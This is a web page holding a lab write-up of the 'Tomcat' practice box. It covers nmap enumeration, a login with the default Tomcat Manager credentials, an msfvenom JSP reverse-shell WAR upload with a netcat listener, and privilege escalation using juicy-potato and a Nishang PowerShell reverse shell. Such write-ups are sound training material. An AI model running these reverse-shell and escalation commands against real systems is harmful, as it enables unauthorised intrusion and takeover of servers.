<!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="preload" as="image" href="/avatar.jpg"/><link rel="stylesheet" href="/_next/static/css/89fdb76f795b0797.css" data-precedence="next"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack-6bf358eca9a0310b.js"/><script src="/_next/static/chunks/4bd1b696-db28424fe4d701e0.js" async=""></script><script src="/_next/static/chunks/517-e8f1eb4c9a59fc78.js" async=""></script><script src="/_next/static/chunks/main-app-431dcfd7004f3945.js" async=""></script><script src="/_next/static/chunks/4bd22374-02665d04d05c313a.js" async=""></script><script src="/_next/static/chunks/173-546eff084523247c.js" async=""></script><script src="/_next/static/chunks/541-ed6782f5dfc7fbce.js" async=""></script><script src="/_next/static/chunks/699-e9f42f6cd5cf3589.js" async=""></script><script src="/_next/static/chunks/app/cyber/writeup/tomcat/page-e5f29d364138f057.js" async=""></script><link rel="icon" href="/favicon.ico" type="image/x-icon" sizes="16x16"/><script src="/_next/static/chunks/polyfills-42372ed130431b0a.js" noModule=""></script></head><body><div class="Wrapper"><div><div class="burger-menu">â˜° <!-- -->            </div><div class="sidebarLeft "><div class="avatar"><img src="/avatar.jpg" alt="Avatar"/></div><ul><a href="/"><li>Search</li></a><a href="/cyber/writeup"><li>Writeups</li></a><a href="/cyber/blog"><li>Blog</li></a><a href="/cyber/tags"><li>Tags</li></a><a href=""><li style="color:#555555">Resources</li></a><a href=""><li style="color:#555555"><s>Contact</s></li></a></ul></div></div><div class="content"><div class="Post"><div><div id="Ignite"><div><h1> <span style="color:#da1953">Tom</span>cat</h1><hr></div><div id="banner"><div><img src="/cyber/writeup/tomcat/banner.gif" alt=""></div></div><div id="Scanning"><div><hr><h1><span style="color:#da1953">Sca</span>nning</h1></div><div><p>Enumerating <em>192.169.22.100/24</em> to find the host running Apache with nmap <code>nmap -sC -sV 192.168.22.100/24</code>. After the Apache scan it appears to be running on <em>192.168.22.150</em>.</p></div><div><p><pre>Nmap scan report for 192.168.22.150<br>Host is up (0.042s latency).<br>Not shown: 991 filtered ports<br>PORT      STATE SERVICE            VERSION<br>22/tcp    open  ssh                OpenSSH for_Windows_8.1 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 6f:b4:44:da:96:20:97:54:e8:1a:9e:61:96:8f:da:95 (RSA)<br>|   256 87:ac:a8:b4:fa:2f:bd:e5:35:15:c1:01:5c:8d:e7:fd (ECDSA)<br>|_  256 aa:7b:1c:8c:1a:52:b3:40:a8:0e:47:c9:c9:e0:a5:ba (ED25519)<br>135/tcp   open  msrpc              Microsoft Windows RPC<br>139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn<br>445/tcp   open  microsoft-ds?<br>3389/tcp  open  ssl/ms-wbt-server?<br>| rdp-ntlm-info: <br>|   Target_Name: UK<br>|   NetBIOS_Domain_Name: UK<br>|   NetBIOS_Computer_Name: TOMCAT<br>|   DNS_Domain_Name: uk.mwr.com<br>|   DNS_Computer_Name: TOMCAT.uk.mwr.com<br>|   DNS_Tree_Name: mwr.com<br>|   Product_Version: 6.3.9600<br>|_  System_Time: 2021-06-05T13:08:40+00:00<br>| ssl-cert: Subject: commonName=TOMCAT.uk.mwr.com<br>| Not valid before: 2021-01-28T11:47:11<br>|_Not valid after:  2021-07-30T11:47:11<br>8080/tcp  open  http               Apache Tomcat 8.5.50<br>|_http-favicon: Apache Tomcat<br>|_http-open-proxy: Proxy might be redirecting requests<br>|_http-title: Apache Tomcat/8.5.50<br>49154/tcp open  msrpc              Microsoft Windows RPC<br>49155/tcp open  msrpc              Microsoft Windows RPC<br>49156/tcp open  msrpc              Microsoft Windows RPC<br>MAC Address: 00:15:5D:15:04:02 (Microsoft)<br>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows<br></pre></p></div></div><div id="Tomcat-credentials"><div><h1><span style="color:#da1953">Tom</span>cat credentials</h1></div><div><p>The default credentials are <b>tomcat:tomcat</b> which I guessed tried some common combination of username and password.</p></div></div><div id="Reverse-shell"><div><h1><span style="color:#da1953">Rev</span>erse shell</h1></div><div><p>To be able to see under which user the Tomcat service is running I need to have access to the server. Since I have access to the Tomcat Manager page, I can upload a malicious war file to get a reverse shell.</p></div><div><p>To create the malicious war file, I use the following command: <code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.22.2 LPORT=4444 -f war &gt; shell.war</code> Where the IP is the one assigned to me at the interface Tap0 and a port of my choice.</p></div><div><p><img src="/cyber/writeup/tomcat/8213f2c1eb5549339e6b0b773ce64c6e.png"></p></div><div><p>Now I must listen to the port chosen by me (4444) waiting for the incoming connection upon uploading the malicious war file, in order to receive the conneciton I have to execute the following commands <code>nc -lvp 4444</code>.</p></div><div><p><img src="/cyber/writeup/tomcat/e7893a774fbb4eeea8e8b2edd5f2036e.png"></p></div><div><p>From the Tomcat manager page, I must upload the malicious war file created.</p></div><div><p><img src="/cyber/writeup/tomcat/64642cbd358b4f7cb7605045a0803267.png"></p></div><div><p>To get a connection I must navigate to the path where the file was uploaded by clicking the link or writing the URL in the browser. In this way the malicious code inside the war file will be executed and it will try to connec to the given IP and PORT.</p></div><div><p><img src="/cyber/writeup/tomcat/fdfaa8c703c04b1ea4d5db63fefca8cb.png"></p></div><div><p><img src="/cyber/writeup/tomcat/2c61db120a9443f4bc3b02d350aea0d9.png"></p></div><div><p>At this point, I have a connection and I am given a shell.</p></div><div><p><img src="/cyber/writeup/tomcat/83059155708a4a9a8477ba957ec456f0.png"></p></div><div><p>Now finally I can check under which user the service Tomcat is running. To see the list of processes I ran the command <code>tasklist /V</code>, and the Tomcat service appears to be run by <em>AUTHORITY\LOCAL SERVICE</em> which does not have elevated privilege.</p></div><div><p><img src="/cyber/writeup/tomcat/9d804782f597427d9f3b13652f9eeddb.png"></p></div><div></div></div><div id="Missconfigurations"><div><h1><span style="color:#da1953">Mis</span>sconfigurations</h1></div><div><p>After searching for a misconfiguration I found that <em>SeImpersonatePrivilege</em> is enabled by russing <code>whoami /all</code>.</p></div><div><p><img src="/cyber/writeup/tomcat/661371e0a3c34651a8c5fdc3dfb5a78c.png"></p></div><div><p>So now I can try some tools to gain privileged access to the box.</p></div></div><div id="Privilege-escalation"><div><h1><span style="color:#da1953">Pri</span>vilege escalation</h1></div><div><p>In order to read the flag.txt file I had to privilege escalation since the normal shell did not  me to read it and did not have the permissions. To do privilege escalation I used a tool called <em>juicy-potato</em>. Before running this tool, I had to prepare a reverse PowerShell and a Nihsang shell obtained from <a data-from-md title='https://github.com/samratashok/nishang' href='https://github.com/samratashok/nishang'>GitHub</a>. The shell in question is called <em>Invoke-PowerShellTcp.ps1</em> to which I set the parameters as follows.</p></div><div><p><img src="/cyber/writeup/tomcat/a32de62d8bc54dc092fb5c4e2b4a5b29.png"></p></div><div><p>The IP address is the IP address assigned to my tap0 interface while the port is my choice.</p></div><div><p><img src="/cyber/writeup/tomcat/0adcf3fa59074225a5dde9f087010cb6.png"></p></div><div><p>Also, I have prepared a bat file that runs the reverse PowerShell in the following way: <code>powershell.exe -ExecutionPolicy Unrestricted -Command &quot;C:\Users\Public\Downloads\rev.ps1&quot;</code></p></div><div><p><img src="/cyber/writeup/tomcat/96016da9af7a4da8a4b3f8d8130e72d5.png"></p></div><div><p>Remember to use an absolute path otherwise, it might not work! Then I uploaded the juicy-potato, reverse PowerShell and the bat file to the server via the Python webserver.</p></div><div><p><img src="/cyber/writeup/tomcat/3632eb85dedf4edc9a06dcf2933aafbb.png"></p></div><div><p><img src="/cyber/writeup/tomcat/fcfafd6879ba43d6b046a8d9c2daca90.png"></p></div><div><p>After obtaining all the three necessary elements, I used juicy-potato (renamed as j.exe) to create an elevated process that reconnected to my listening netcat in order to obtain a privileged reverse shell. <code>j.exe -t * -p C:\Users\Public\Downloads\rev.bat -l 9001</code> Note that here port 9001 doesn't matter so I can put whatever I want</p></div><div><p><img src="/cyber/writeup/tomcat/813cc540a1c448ac85eee6695ce28b79.png"></p></div><div><p><img src="/cyber/writeup/tomcat/18d8f9083d0f4719b72d0b21b032e1dc.png"></p></div></div></div> </div></div></div><div class="sidebarRight"><div class="sidebarRightChild"><h2>Index</h2><div></div><br/><h2>Tags</h2><div class="tags"><a style="margin-top:10px" href="/cyber/tags?searchTag=Gym+Manager+1.0"><my-tag>Gym Manager 1.0</my-tag></a><a style="margin-top:10px" href="/cyber/tags?searchTag=apache+2.4.43"><my-tag>apache 2.4.43</my-tag></a><a style="margin-top:10px" href="/cyber/tags?searchTag=box"><my-tag>box</my-tag></a><a style="margin-top:10px" href="/cyber/tags?searchTag=chisel"><my-tag>chisel</my-tag></a><a style="margin-top:10px" href="/cyber/tags?searchTag=cloudme+1.11.2"><my-tag>cloudme 1.11.2</my-tag></a><a style="margin-top:10px" href="/cyber/tags?searchTag=cms"><my-tag>cms</my-tag></a><a style="margin-top:10px" href="/cyber/tags?searchTag=ctf"><my-tag>ctf</my-tag></a><a style="margin-top:10px" href="/cyber/tags?searchTag=curl"><my-tag>curl</my-tag></a><a style="margin-top:10px" href="/cyber/tags?searchTag=download+file"><my-tag>download file</my-tag></a><a style="margin-top:10px" href="/cyber/tags?searchTag=easy"><my-tag>easy</my-tag></a><a style="margin-top:10px" href="/cyber/tags?searchTag=htb"><my-tag>htb</my-tag></a><a style="margin-top:10px" href="/cyber/tags?searchTag=iwr"><my-tag>iwr</my-tag></a><a style="margin-top:10px" href="/cyber/tags?searchTag=nsfvenom"><my-tag>nsfvenom</my-tag></a><a style="margin-top:10px" href="/cyber/tags?searchTag=port+forwarding"><my-tag>port forwarding</my-tag></a><a style="margin-top:10px" href="/cyber/tags?searchTag=powershell"><my-tag>powershell</my-tag></a><a style="margin-top:10px" href="/cyber/tags?searchTag=powershell+iwr"><my-tag>powershell iwr</my-tag></a><a style="margin-top:10px" href="/cyber/tags?searchTag=privesc"><my-tag>privesc</my-tag></a><a style="margin-top:10px" href="/cyber/tags?searchTag=python+webserver"><my-tag>python webserver</my-tag></a><a style="margin-top:10px" href="/cyber/tags?searchTag=web"><my-tag>web</my-tag></a><a style="margin-top:10px" href="/cyber/tags?searchTag=windows"><my-tag>windows</my-tag></a><a style="margin-top:10px" href="/cyber/tags?searchTag=winpeas"><my-tag>winpeas</my-tag></a></div></div></div></div><script src="/_next/static/chunks/webpack-6bf358eca9a0310b.js" async=""></script><script>(self.__next_f=self.__next_f||[]).push([0])</script><script>self.__next_f.push([1,"1:\"$Sreact.fragment\"\n2:I[5244,[],\"\"]\n3:I[3866,[],\"\"]\n4:I[3108,[\"667\",\"static/chunks/4bd22374-02665d04d05c313a.js\",\"173\",\"static/chunks/173-546eff084523247c.js\",\"541\",\"static/chunks/541-ed6782f5dfc7fbce.js\",\"699\",\"static/chunks/699-e9f42f6cd5cf3589.js\",\"894\",\"static/chunks/app/cyber/writeup/tomcat/page-e5f29d364138f057.js\"],\"default\"]\n5:I[5897,[\"667\",\"static/chunks/4bd22374-02665d04d05c313a.js\",\"173\",\"static/chunks/173-546eff084523247c.js\",\"541\",\"static/chunks/541-ed6782f5dfc7fbce.js\",\"699\",\"static/chunks/699-e9f42f6cd5cf3589.js\",\"894\",\"static/chunks/app/cyber/writeup/tomcat/page-e5f29d364138f057.js\"],\"default\"]\n6:I[8845,[\"667\",\"static/chunks/4bd22374-02665d04d05c313a.js\",\"173\",\"static/chunks/173-546eff084523247c.js\",\"541\",\"static/chunks/541-ed6782f5dfc7fbce.js\",\"699\",\"static/chunks/699-e9f42f6cd5cf3589.js\",\"894\",\"static/chunks/app/cyber/writeup/tomcat/page-e5f29d364138f057.js\"],\"default\"]\n7:I[6213,[],\"OutletBoundary\"]\n9:I[6213,[],\"MetadataBoundary\"]\nb:I[6213,[],\"ViewportBoundary\"]\nd:I[4835,[],\"\"]\n:HL[\"/_next/static/css/89fdb76f795b0797.css\",\"style\"]\n"])</script><script>self.__next_f.push([1,"0:{\"P\":null,\"b\":\"oECYVVc9JNPZIxMhf7LKs\",\"p\":\"\",\"c\":[\"\",\"cyber\",\"writeup\",\"tomcat\"],\"i\":false,\"f\":[[[\"\",{\"children\":[\"cyber\",{\"children\":[\"writeup\",{\"children\":[\"tomcat\",{\"children\":[\"__PAGE__\",{}]}]}]}]},\"$undefined\",\"$undefined\",true],[\"\",[\"$\",\"$1\",\"c\",{\"children\":[null,[\"$\",\"html\",null,{\"lang\":\"en\",\"children\":[\"$\",\"body\",null,{\"children\":[\"$\",\"$L2\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\"],\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L3\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":[[],[[\"$\",\"title\",null,{\"children\":\"404: This page could not be found.\"}],[\"$\",\"div\",null,{\"style\":{\"fontFamily\":\"system-ui,\\\"Segoe UI\\\",Roboto,Helvetica,Arial,sans-serif,\\\"Apple Color Emoji\\\",\\\"Segoe UI Emoji\\\"\",\"height\":\"100vh\",\"textAlign\":\"center\",\"display\":\"flex\",\"flexDirection\":\"column\",\"alignItems\":\"center\",\"justifyContent\":\"center\"},\"children\":[\"$\",\"div\",null,{\"children\":[[\"$\",\"style\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"body{color:#000;background:#fff;margin:0}.next-error-h1{border-right:1px solid rgba(0,0,0,.3)}@media (prefers-color-scheme:dark){body{color:#fff;background:#000}.next-error-h1{border-right:1px solid rgba(255,255,255,.3)}}\"}}],[\"$\",\"h1\",null,{\"className\":\"next-error-h1\",\"style\":{\"display\":\"inline-block\",\"margin\":\"0 20px 0 0\",\"padding\":\"0 23px 0 0\",\"fontSize\":24,\"fontWeight\":500,\"verticalAlign\":\"top\",\"lineHeight\":\"49px\"},\"children\":404}],[\"$\",\"div\",null,{\"style\":{\"display\":\"inline-block\"},\"children\":[\"$\",\"h2\",null,{\"style\":{\"fontSize\":14,\"fontWeight\":400,\"lineHeight\":\"49px\",\"margin\":0},\"children\":\"This page could not be found.\"}]}]]}]}]]],\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]}]}]]}],{\"children\":[\"cyber\",[\"$\",\"$1\",\"c\",{\"children\":[null,[\"$\",\"$L2\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\",\"cyber\",\"children\"],\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L3\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]]}],{\"children\":[\"writeup\",[\"$\",\"$1\",\"c\",{\"children\":[null,[\"$\",\"$L2\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\",\"cyber\",\"children\",\"writeup\",\"children\"],\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L3\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]]}],{\"children\":[\"tomcat\",[\"$\",\"$1\",\"c\",{\"children\":[null,[\"$\",\"$L2\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\",\"cyber\",\"children\",\"writeup\",\"children\",\"tomcat\",\"children\"],\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L3\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]]}],{\"children\":[\"__PAGE__\",[\"$\",\"$1\",\"c\",{\"children\":[[\"$\",\"div\",null,{\"className\":\"Wrapper\",\"children\":[[\"$\",\"$L4\",null,{}],[\"$\",\"div\",null,{\"className\":\"content\",\"children\":[\"$\",\"div\",null,{\"className\":\"Post\",\"children\":[\"$\",\"$L5\",null,{\"postname\":\"writeupdb/tomcat.json\"}]}]}],[\"$\",\"$L6\",null,{\"postname\":\"writeupdb/tomcat.json\"}]]}],[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/89fdb76f795b0797.css\",\"precedence\":\"next\",\"crossOrigin\":\"$undefined\",\"nonce\":\"$undefined\"}]],[\"$\",\"$L7\",null,{\"children\":\"$L8\"}]]}],{},null,false]},null,false]},null,false]},null,false]},null,false],[\"$\",\"$1\",\"h\",{\"children\":[null,[\"$\",\"$1\",\"eqBl2pTk90QdST8W1CsZj\",{\"children\":[[\"$\",\"$L9\",null,{\"children\":\"$La\"}],[\"$\",\"$Lb\",null,{\"children\":\"$Lc\"}],null]}]]}],false]],\"m\":\"$undefined\",\"G\":[\"$d\",\"$undefined\"],\"s\":false,\"S\":true}\n"])</script><script>self.__next_f.push([1,"c:[[\"$\",\"meta\",\"0\",{\"name\":\"viewport\",\"content\":\"width=device-width, initial-scale=1\"}]]\na:[[\"$\",\"meta\",\"0\",{\"charSet\":\"utf-8\"}],[\"$\",\"link\",\"1\",{\"rel\":\"icon\",\"href\":\"/favicon.ico\",\"type\":\"image/x-icon\",\"sizes\":\"16x16\"}]]\n"])</script><script>self.__next_f.push([1,"8:null\n"])</script></body></html>